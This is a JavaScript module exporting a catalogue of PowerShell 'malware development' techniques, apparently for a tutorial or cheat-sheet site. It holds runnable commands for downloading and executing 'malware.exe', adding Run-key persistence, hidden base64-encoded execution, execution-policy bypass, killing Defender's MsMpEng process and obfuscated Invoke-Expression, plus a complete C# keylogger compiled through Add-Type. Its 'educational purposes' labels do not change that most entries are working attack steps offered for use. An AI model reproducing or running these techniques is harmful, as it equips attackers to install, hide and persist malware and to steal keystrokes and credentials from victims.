const MalwareDevSyntax = {
    "malwareDevelopmentExamples": [
      {
        "name": "Download File",
        "description": "Downloads a file from a remote server.",
        "example": "Invoke-WebRequest -Uri 'http://example.com/file.exe' -OutFile 'C:\\temp\\file.exe'",
        "details": {
          "how_it_works": "The 'Invoke-WebRequest' cmdlet is used to download files from a remote server. Malware often uses this command to download additional payloads.",
          "use_cases": ["Downloading files for legitimate purposes", "Malicious actors downloading payloads"],
          "additional_examples": [
            "Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile 'C:\\Users\\Public\\malware.exe'",
            "Invoke-WebRequest -Uri 'https://trustedsource.com/installer.msi' -OutFile 'C:\\Installers\\installer.msi'"
          ]
        },
        "meta": {
          "title": "PowerShell Download File Example",
          "description": "Learn how to use 'Invoke-WebRequest' in PowerShell to download files from a remote server.",
          "keywords": "powershell, Invoke-WebRequest, download, file"
        }
      },
      {
        "name": "Execute File",
        "description": "Executes a downloaded file.",
        "example": "Start-Process -FilePath 'C:\\temp\\file.exe'",
        "details": {
          "how_it_works": "The 'Start-Process' cmdlet is used to execute a file. Malware often uses this command to run the downloaded payload.",
          "use_cases": ["Executing legitimate applications", "Malicious actors executing payloads"],
          "additional_examples": [
            "Start-Process -FilePath 'C:\\Users\\Public\\malware.exe'",
            "Start-Process -FilePath 'C:\\Installers\\installer.msi'"
          ]
        },
        "meta": {
          "title": "PowerShell Execute File Example",
          "description": "Learn how to use 'Start-Process' in PowerShell to execute files.",
          "keywords": "powershell, Start-Process, execute, file"
        }
      },
      {
        "name": "Add Registry Key",
        "description": "Adds a registry key for persistence.",
        "example": "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyApp' -Value 'C:\\temp\\file.exe'",
        "details": {
          "how_it_works": "The 'Set-ItemProperty' cmdlet is used to add or modify registry keys. Malware often uses this command to achieve persistence by adding entries to the startup registry keys.",
          "use_cases": ["Adding registry keys for configuration", "Malicious actors achieving persistence"],
          "additional_examples": [
            "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Malware' -Value 'C:\\Users\\Public\\malware.exe'",
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\Installers\\installer.msi'"
          ]
        },
        "meta": {
          "title": "PowerShell Add Registry Key Example",
          "description": "Learn how to use 'Set-ItemProperty' in PowerShell to add or modify registry keys.",
          "keywords": "powershell, Set-ItemProperty, registry, persistence"
        }
      },
      {
        "name": "Encode Command",
        "description": "Encodes a command to evade detection.",
        "example": "$command = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Start-Process calc.exe'))",
        "details": {
          "how_it_works": "Encoding commands can help evade detection by security software. The 'Convert' class is used to encode the command in base64.",
          "use_cases": ["Encoding commands for legitimate uses", "Malicious actors evading detection"],
          "additional_examples": [
            "$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\\temp\\processes.txt'))",
            "$command = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + $encodedCommand"
          ]
        },
        "meta": {
          "title": "PowerShell Encode Command Example",
          "description": "Learn how to encode commands in PowerShell to evade detection.",
          "keywords": "powershell, Encode, command, detection"
        }
      },
      {
        "name": "Bypass Execution Policy",
        "description": "Bypasses the PowerShell execution policy.",
        "example": "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
        "details": {
          "how_it_works": "The 'ExecutionPolicy' parameter can be used to bypass the execution policy set on a system. Malware often uses this to execute scripts that would otherwise be blocked.",
          "use_cases": ["Executing scripts in restricted environments", "Malicious actors bypassing security settings"],
          "additional_examples": [
            "powershell.exe -ExecutionPolicy Bypass -Command 'Start-Process calc.exe'",
            "powershell.exe -ExecutionPolicy Unrestricted -File C:\\scripts\\install.ps1"
          ]
        },
        "meta": {
          "title": "PowerShell Bypass Execution Policy Example",
          "description": "Learn how to bypass the PowerShell execution policy using the 'ExecutionPolicy' parameter.",
          "keywords": "powershell, ExecutionPolicy, bypass, script"
        }
      },
      {
        "name": "List Processes",
        "description": "Lists all running processes on the system.",
        "example": "Get-Process",
        "details": {
          "how_it_works": "The 'Get-Process' cmdlet retrieves information about the processes running on the system. This information can be useful for monitoring and managing system performance.",
          "use_cases": ["Monitoring system processes", "Malicious actors gathering information"],
          "additional_examples": [
            "Get-Process | Where-Object { $_.CPU -gt 100 }",
            "Get-Process | Out-File C:\\temp\\processes.txt"
          ]
        },
        "meta": {
          "title": "PowerShell List Processes Example",
          "description": "Learn how to use 'Get-Process' in PowerShell to list all running processes on the system.",
          "keywords": "powershell, Get-Process, processes, list"
        }
      },
      {
        "name": "Capture Screenshot",
        "description": "Captures a screenshot of the current screen.",
        "example": "$bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size); $bitmap.Save('C:\\temp\\screenshot.png')",
        "details": {
          "how_it_works": "This script captures a screenshot using .NET classes and saves it as an image file. Malware might use similar techniques to capture sensitive information displayed on the screen.",
          "use_cases": ["Capturing screenshots for legitimate purposes", "Malicious actors capturing sensitive information"],
          "additional_examples": [
            "$bitmap.Save('C:\\Users\\Public\\screenshot.png')",
            "$bitmap.Save('C:\\screenshots\\screen1.png')"
          ]
        },
        "meta": {
          "title": "PowerShell Capture Screenshot Example",
          "description": "Learn how to use PowerShell to capture a screenshot using .NET classes.",
          "keywords": "powershell, screenshot, capture, .NET"
        }
      },
      {
        "name": "Keylogger Example",
        "description": "Logs keystrokes to a file.",
        "example": "$code = @'\nusing System;\nusing System.IO;\nusing System.Runtime.InteropServices;\n\npublic class Keylogger {\n [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i);\n public static void Main() {\n  string filePath = \"C:\\temp\\keylogs.txt\";\n  using (StreamWriter sw = new StreamWriter(filePath)) {\n   while (true) {\n    for (int i = 0; i < 255; i++) {\n     int keyState = GetAsyncKeyState(i);\n     if (keyState == 1 || keyState == -32767) {\n      sw.Write((ConsoleKey)i);\n      sw.Flush();\n     }\n    }\n   }\n  }\n }\n}\n'@\nAdd-Type -TypeDefinition $code -Language CSharp\n[Keylogger]::Main()",
        "details": {
          "how_it_works": "This script compiles and runs a simple keylogger using C# code within PowerShell. It logs all keystrokes to a file. This example demonstrates how malware might implement keylogging.",
          "use_cases": ["Educational purposes", "Understanding keylogging techniques"],
          "additional_examples": [
            "string filePath = \"C:\\Users\\Public\\keylogs.txt\";",
            "using (StreamWriter sw = new StreamWriter(filePath)) { ... }"
          ]
        },
        "meta": {
          "title": "PowerShell Keylogger Example",
          "description": "Learn how keyloggers can be implemented using PowerShell and C# code. This example is for educational purposes only.",
          "keywords": "powershell, keylogger, example, C#"
        }
      },
      {
        "name": "Credential Harvesting",
        "description": "Harvests credentials from the system.",
        "example": "Get-Credential | Export-Clixml -Path 'C:\\temp\\credentials.xml'",
        "details": {
          "how_it_works": "This command prompts the user for credentials and saves them to an XML file. Malware might use similar techniques to harvest user credentials.",
          "use_cases": ["Storing credentials securely", "Educational purposes"],
          "additional_examples": [
            "$creds = Get-Credential; Export-Clixml -InputObject $creds -Path 'C:\\Users\\Public\\creds.xml'",
            "Import-Clixml -Path 'C:\\temp\\credentials.xml'"
          ]
        },
        "meta": {
          "title": "PowerShell Credential Harvesting Example",
          "description": "Learn how credentials can be harvested using PowerShell. This example is for educational purposes only.",
          "keywords": "powershell, credentials, harvesting, example"
        }
      },
      {
        "name": "Disable Security Tools",
        "description": "Disables common security tools.",
        "example": "Stop-Process -Name 'MsMpEng'",
        "details": {
          "how_it_works": "The 'Stop-Process' cmdlet is used to stop processes. Malware might use this command to disable security tools like antivirus software.",
          "use_cases": ["Stopping unnecessary processes", "Educational purposes"],
          "additional_examples": [
            "Stop-Process -Name 'Symantec'",
            "Stop-Process -Name 'McAfee'"
          ]
        },
        "meta": {
          "title": "PowerShell Disable Security Tools Example",
          "description": "Learn how processes can be stopped using PowerShell. This example is for educational purposes only.",
          "keywords": "powershell, Stop-Process, disable, security tools"
        }
      },
      {
        "name": "Obfuscate Script",
        "description": "Obfuscates a PowerShell script to evade detection.",
        "example": "$script = 'Write-Host \"Hello, World!\"'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))",
        "details": {
          "how_it_works": "This command encodes a PowerShell script in base64, making it harder to detect and analyze. Malware often uses obfuscation to evade detection.",
          "use_cases": ["Obfuscating scripts for legitimate reasons", "Educational purposes"],
          "additional_examples": [
            "$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Start-Process calc.exe'))",
            "Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedScript)))"
          ]
        },
        "meta": {
          "title": "PowerShell Obfuscate Script Example",
          "description": "Learn how PowerShell scripts can be obfuscated to evade detection. This example is for educational purposes only.",
          "keywords": "powershell, obfuscate, script, example"
        }
      }
    ]
  }
  
module.exports = MalwareDevSyntax